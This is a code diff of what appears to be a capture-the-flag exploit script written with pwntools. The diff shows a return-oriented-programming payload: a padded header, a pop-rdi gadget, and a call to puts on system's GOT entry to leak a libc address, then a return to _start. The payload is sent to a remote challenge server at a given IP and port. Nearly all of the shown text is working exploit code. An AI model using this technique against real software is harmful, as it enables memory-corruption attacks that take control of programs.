@@ -20,10 +20,7 @@ en_tete = "\xf0\x9f\x91\x93\xe2\x9a\xa1\x00"+"aaaaaaaa"*4
 pop_rdi_ret = 0x4011b3
 ret = 0x4007ce
 
-got_system = elf.got["system"]
-puts_plt = elf.plt["puts"]
-ret2main = elf.symbols["_start"]
-payload1 = bb(en_tete+p64(pop_rdi_ret)+p64(got_system)+p64(puts_plt)+p64(ret2main),"aleph.zip")
+payload1 = bb(en_tete+p64(pop_rdi_ret)+p64(elf.got["system"])+p64(elf.plt["puts"])+p64(elf.symbols["_start"]),"aleph.zip")
 
 p = remote("206.189.118.55", 30649)
 p.sendline("Aaa"); sleep(1)
